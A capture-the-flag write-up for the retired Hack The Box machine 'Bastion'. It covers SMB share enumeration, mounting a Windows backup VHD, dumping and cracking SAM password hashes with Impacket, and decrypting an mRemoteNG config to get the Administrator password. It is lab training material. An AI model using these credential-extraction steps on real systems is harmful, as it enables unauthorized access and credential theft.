# Bastion

This is the write-up for the box Bastion that got retired at the 7th September 2019.
My IP address was 10.10.15.199 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.134    bastion.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/bastion.nmap 10.10.10.134
```

```markdown
PORT    STATE SERVICE      VERSION
22/tcp  open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

## Checking SMB (Port 445)

Lets look for shares:
```markdown
smbclient -L //10.10.10.134
```
 ```markdown       
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
Backups         Disk      
C$              Disk      Default share
IPC$            IPC       Remote IPC
```

The only share that is unique is _Backups_. Lets look for the permissions any user has:
```markdown
smbmap -u testuser -H 10.10.10.134
```

We got Read-Write permissions on that share so we should mount this to find something:

```markdown
mount -t cifs //10.10.10.134/Backups /mnt/smb/
```

There is a file named **note.txt** that says:
> Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.

In this share we see a folder _WindowsBackupImage_ which looks like a backup from another PC and the folder is over 5 GB in size.
The path that has interesting files is:
> WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/

In this path we got a **.vhd** file that has a file size around 5 GB. We can view the files with 7zip but that takes to long.
```markdown
7z l 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
```

We should mount that to our local system to browse it more comfortably. To do that we need to install the **libguestfs-tools**.
```markdown
apt install libguestfs-tools
```

Now we get the _guestmount_ command to mount a VHD file in Linux.
```markdown
guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro -v /mnt/vhd
```

We can browse through the vhd file on the mounted path.

### Checking the VHD file

We see that we are in a C: drive of a Windows PC. Now we can extract passwords to see if we can use that later for SSH.
To do that we copy the files **SYSTEM** and **SAM** that are both located in **Windows/System32/config/** to our local machine.

- SAM
  - User database
- SYSTEM
  - Boot key to decrypt SAM database
 
With an Impacket script we can easily extract the hashes:
```markdown
impacket-secretsdump -sam SAM -system SYSTEM local
```

This is the output:
```markdown
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
```

The _31d6_ tells us that the Administrator account either has no password set or is disabled so we need to decrypt the hash of _L4mpje_.
His hash can be found on _hashes.org_ and is:
> bureaulampje

Trying the user with that password on SSH and we have a shell!

## Privilege Escalation

When we check for the Administrators account and group we can see that the last logon was not long ago, but the SAM and SYSTEM files were from February.
That explains why the account shows a blank password.

After enumerating for a while you we find an interesting program that is installed on the box. It is mRemoteNG, that is used to manage several server sessions in one application.
That is what a Bastion host does.

This application had a vulnerability where you could decrypt and extract the password from the configuration file. 
There is a script on GitHub called [mRemoteNG-Decrypt](https://github.com/haseebT/mRemoteNG-Decrypt) that we will use for that task. 

The configuration file is located here:
> C:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml

If we search for _password_ in that file we will get two strings:
```markdown
user:L4mpje Password:yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB
user:Administrator Password:aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
```
```markdown
python mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
```


Decrypting the string from _L4mpje_ will result in the same password as before. So the script is working.
Now decrypt the string from Administrator and we get a password:
> thXLHM96BeKL0ER2

We try this password with Administrator on SSH:
```markdown
ssh Administrator@10.10.10.134
``` 

We are logged in as Administrator on the box!

> Tip: If we use Impackets psexec.py we will be logged in as _NT Authority/SYSTEM_.

